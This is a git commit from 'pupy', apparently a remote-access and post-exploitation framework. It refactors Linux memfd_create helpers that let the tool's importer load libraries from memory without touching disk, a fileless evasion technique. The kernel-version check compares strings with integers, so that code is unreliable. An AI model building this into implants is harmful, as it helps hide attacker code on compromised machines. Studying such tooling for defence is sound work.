6ef48127cd9c7c902ea670183072f448692b49c0
Oleksii Shevchuk <alxchk@gmail.com>
2019-12-31 13:14:25 +0200

    linux/memfd: move python/memfd code out from pupyimporter

---
+++ pupy/pupy/_linux_memfd.py
@@ -0,0 +1,83 @@
+# -*- encoding: utf-8 -*-
+
+__all__ = (
+    'memfd_create', 'memfd_is_supported'
+)
+
+import os
+import sys
+import ctypes
+import platform
+
+import pupy
+
+SELF = ctypes.CDLL(None)
+syscall = SELF.syscall
+
+
+def _get_nr_memfd_create_syscall():
+    __NR_memfd_create_syscall = {
+        'x86_64': 319,
+        'i686': 356,
+        'arm': 385,
+    }
+
+    machine = platform.machine()
+    if machine.startswith('arm'):
+        machine = 'arm'
+
+    return __NR_memfd_create_syscall.get(machine, None)
+
+
+NR_memfd_create = _get_nr_memfd_create_syscall()
+
+
+def _memfd_create(name):
+    return syscall(NR_memfd_create, name, 0x1)
+
+
+def memfd_is_supported():
+    if not sys.platform.startswith('linux'):
+        pupy.dprint('memfd: disabled for non-linux')
+        return False
+
+    if platform.system() == 'Java':
+        pupy.dprint('memfd: disabled for jython')
+        return False
+
+    maj, min = platform.release().split('.')[:2]
+    if maj < 3:
+        pupy.dprint('memfd: kernel too old (maj < 3)')
+        return False
+    elif maj == 3 and min < 13:
+        pupy.dprint('memfd: kernel too old (maj == 3, min < 13)')
+        return False
+
+    if NR_memfd_create is None:
+        pupy.dprint('memfd: Syscall NR is not defined')
+        return False
+
+    fd = _memfd_create('probe')
+    if fd == -1:
+        pupy.dprint('memfd: probe failed')
+        return False
+
+    try:
+        supported = os.path.isfile(
+            os.path.sep + os.path.join(
+            'proc', 'self', 'fd', str(fd)))
+        pupy.dprint('memfd: supported={} (fd={})', supported, fd)
+
+        return supported
+    finally:
+        os.close(fd)
+
+
+def memfd_create(name='heap'):
+    fd = _memfd_create(name)
+    if fd == -1:
+        raise OSError('memfd_create failed')
+
+    return os.fdopen(fd, 'wb'), os.path.sep + os.path.join(
+        'proc', str(os.getpid()), 'fd', str(fd)
+    )
--- pupy/pupy/memimporter/linux.py
+++ pupy/pupy/memimporter/linux.py
@@ -5,16 +5,20 @@ __all__ = ('load_content',)
 
 import os
 import sys
-import platform
 import ctypes
 
 import pupy
+
+from pupy._linux_memfd import (
+    memfd_is_supported, memfd_create
+)
 
 from .utils import (
     load_library_common, find_writable_folder, _Py_PackageContext
 )
 
 from .posix import _does_dest_allows_executable_mappings
+
 
 TMP_FOLDERS = ['/dev/shm', '/tmp', '/var/tmp']
 RTLD_DI_LINKMAP = 2
@@ -34,10 +38,6 @@ strdup = SELF.strdup
 strdup.argtype = [ctypes.c_char_p]
 strdup.restype = ctypes.c_char_p
 
-free = SELF.free
-free.argtype = [ctypes.c_char_p]
-
-syscall = SELF.syscall
 
 try:
     for mount in open('/proc/self/mounts'):
@@ -94,84 +94,7 @@ def _change_dlname(lib, new_name):
     lm.contents.l_libname.contents.l_name = strdup(new_name)
 
 
-def _get_nr_memfd_create_syscall():
-    __NR_memfd_create_syscall = {
-        'x86_64': 319,
-        'i686': 356,
-        'arm': 385,
-    }
-
-    machine = platform.machine()
-    if machine.startswith('arm'):
-        machine = 'arm'
-
-    return __NR_memfd_create_syscall.get(machine, None)
-
-
-NR_memfd_create = _get_nr_memfd_create_syscall()
-
-
-def _memfd_create(name):
-    return syscall(NR_memfd_create, name, 0x1)
-
-
-def memfd_is_supported():
-    if not sys.platform.startswith('linux'):
-        pupy.dprint('memfd: disabled for non-linux')
-        return False
-
-    if platform.system() == 'Java':
-        pupy.dprint('memfd: disabled for jython')
-        return False
-
-    if _Py_PackageContext is None:
-        pupy.dprint('disable memfd because _Py_PackageContext is not supported')
-        return False
-
-    maj, min = platform.release().split('.')[:2]
-    if maj < 3:
-        pupy.dprint('memfd: kernel too old (maj < 3)')
-        return False
-    elif maj == 3 and min < 13:
-        pupy.dprint('memfd: kernel too old (maj == 3, min < 13)')
-        return False
-
-    if syscall is None or dlinfo is None:
-        pupy.dprint(
-            'memfd: syscall={} dlinfo={}',
-            syscall, dlinfo)
-        return False
-
-    if NR_memfd_create is None:
-        pupy.dprint('memfd: Syscall NR is not defined')
-        return False
-
-    fd = _memfd_create('probe')
-    if fd == -1:
-        pupy.dprint('memfd: probe failed')
-        return False
-
-    try:
-        supported = os.path.isfile(
-            os.path.sep + os.path.join(
-            'proc', 'self', 'fd', str(fd)))
-        pupy.dprint('memfd: supported={} (fd={})', supported, fd)
-
-        return supported
-    finally:
-        os.close(fd)
-
-
-def memfd_create(name='heap'):
-    fd = _memfd_create(name)
-    if fd == -1:
-        raise OSError('memfd_create failed')
-
-    return os.fdopen(fd, 'wb'), os.path.sep + os.path.join(
-        'proc', str(os.getpid()), 'fd', str(fd)
-    )
-
-if memfd_is_supported():
+if _Py_PackageContext is not None and dlinfo is not None and memfd_is_supported():
     def load_content(content, name, dlopen=False, initfuncname=None):
         fd, filepath = memfd_create()
         try:
